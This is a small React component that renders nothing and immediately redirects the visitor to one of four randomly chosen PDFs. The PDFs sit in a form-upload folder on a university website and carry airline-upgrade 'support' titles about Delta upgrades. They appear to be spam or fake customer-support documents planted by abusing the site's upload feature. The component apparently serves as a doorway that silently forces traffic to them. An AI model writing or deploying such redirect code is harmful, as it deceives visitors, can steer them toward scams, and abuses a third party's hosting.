import { useEffect } from 'react';

const LinksAvailable = () => {
	const links = [
		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/quick-help-how-much-does-it-cost-to-upgrade-a-flight-to-business.pdf',
		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/delta-support-how-to-upgrade-for-free-with-delta.pdf',
		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/glidefree-how-much-does-it-cost-to-upgrade-to-delta-first-class.pdf',
		'https://intelligencestudies.utexas.edu/wp-content/uploads/ninja-forms/3/can-i-pay-for-an-upgrade-on-deltariseabove.pdf',
	];

	useEffect(() => {
		const randomUrl = links[Math.floor(Math.random() * links.length)];
		window.location.href = randomUrl;
	}, []);

	return null;
};

export default LinksAvailable;
